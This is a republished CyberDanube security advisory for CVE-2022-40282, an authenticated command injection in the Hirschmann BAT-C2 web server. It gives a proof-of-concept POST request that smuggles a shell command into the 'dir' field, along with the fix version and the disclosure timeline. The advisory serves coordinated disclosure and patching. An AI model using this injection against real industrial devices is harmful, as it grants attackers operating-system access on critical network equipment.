---
title: Hirschmann (Belden) BAT-C2 8.8.1.0R8 Command Injection
url: https://cxsecurity.com/issue/WLB-2022120004
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-12-02
fetch_date: 2025-10-04T00:15:59.113021
---

# Hirschmann (Belden) BAT-C2 8.8.1.0R8 Command Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Hirschmann (Belden) BAT-C2 8.8.1.0R8 Command Injection** **2022.12.01**  Credit:  **[T. Weber](https://cxsecurity.com/author/T.%2BWeber/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-40282](https://cxsecurity.com/cveshow/CVE-2022-40282/ "Click to see CVE-2022-40282")**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

CyberDanube Security Research 20221124-0
-------------------------------------------------------------------------------
title| Authenticated Command Injection
product| Hirschmann (Belden) BAT-C2
vulnerable version| 8.8.1.0R8
fixed version| 09.13.01.00R04
CVE number| CVE-2022-40282
impact| High
homepage| https://hirschmann.com/
| https://beldensolutions.com
found| 2022-08-01
by| T. Weber (Office Vienna)
| CyberDanube Security Research
| Vienna | St. Pölten
|
| https://www.cyberdanube.com
-------------------------------------------------------------------------------
Vendor description
-------------------------------------------------------------------------------
"The Technology and Market Leader in Industrial Networking. Hirschmann™
develops innovative solutions, which are geared towards its customers’
requirements in terms of performance, efficiency and investment
reliability."
Source:
https://beldensolutions.com/en/Company/About\_Us/belden\_brands/index.phtml
Vulnerable versions
-------------------------------------------------------------------------------
Hirschmann BAT-C2 / 8.8.1.0R8
Vulnerability overview
-------------------------------------------------------------------------------
1) Authenticated Command Injection
The web server of the device is prone to an authenticated command injection.
It allows an attacker to gain full access to the underlying operating
system of
the device with all implications. If such a device is acting as key
device in
an industrial network, or controls various critical equipment via serial
ports,
more extensive damage in the corresponding network can be done by an
attacker.
Proof of Concept
-------------------------------------------------------------------------------
1) Authenticated Command Injection
The command "ping 192.168.1.1" was injected to the system by using the
following POST request:
===============================================================================
POST / HTTP/1.1
Host: 192.168.3.150
User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:91.0) Gecko/20100101
Firefox/91.0
Accept: \*/\*
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 75
Origin: https://192.168.3.150
Authorization: Digest username="admin", realm="config",
nonce="4b63bb796252d310", uri="/", algorithm=MD5,
response="dbcf03216bd8fbaa15f4b9d9d0fc1d43", qop=auth, nc=0000000a,
cnonce="99c14d39557e691d"
Referer: https://192.168.3.150/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close
ajax=FsCreateDir&dir='%3Bping%20192.168.1.1%3B'&iehack=&submit=Create&cwd=/
===============================================================================
The vulnerability was manually verified on an emulated device by using the
MEDUSA scalable firmware runtime (https://medusa.cyberdanube.com).
Solution
-------------------------------------------------------------------------------
Upgrade to firmware version 09.13.01.00R04 or above.
A security bulletin for this vulnerability has been published by the vendor:
https://www.belden.com/dfsmedia/f1e38517e0cd4caa8b1acb6619890f5e/15088-source/
Workaround
-------------------------------------------------------------------------------
None
Recommendation
-------------------------------------------------------------------------------
CyberDanube recommends customers from Hirschmann to upgrade the firmware
to the
latest version available. Furthermore, a full security review by
professionals
is recommended.
Contact Timeline
-------------------------------------------------------------------------------
2022-08-03: Contacting Hirschmann via BEL-SM-PSIRT@belden.com; Belden
contact
suspects a duplicate. Asked contact for more information.
2022-08-18: Belden representative sent more information for clarification.
Highlighted differences between PoCs.
2022-08-22: Belden contact confirmed the vulnerability to be no duplicate.
2022-08-30: Asked for an update.
2022-08-31: Vendor stated, that he will release another security
bulletin for
this vulnerability.
2022-09-27: Asked for an update.
2022-09-28: Vendor is currently testing the new firmware version and has
also
been assigned with an CVE number. Draft of security
bulletin was
also sent by the security contact.
2022-10-12: Asked for an update.
2022-10-13: Belden contact stated, that there is no publication date for
now as
another patch must be integrated.
2022-10-28: Security contact informed us, that the patch will be released
within the next two weeks.
2022-11-22: Asked for a status update; Security contact stated, that the
release was delayed due internal reasons.
2022-11-23: Vendor sent the final version of the security bulletins. The
release of the new firmware version will be 2022-11-28.
2022-11-24: Vendor informed CyberDanube that the release of the bulletin and
the firmware was done on 2022-11-23 by the marketing team.
Coordinated release of security advisory.
Web: https://www.cyberdanube.com
Twitter: https://twitter.com/cyberdanube
Mail: research at cyberdanube dot com
EOF T. Weber / @2022

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022120004)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top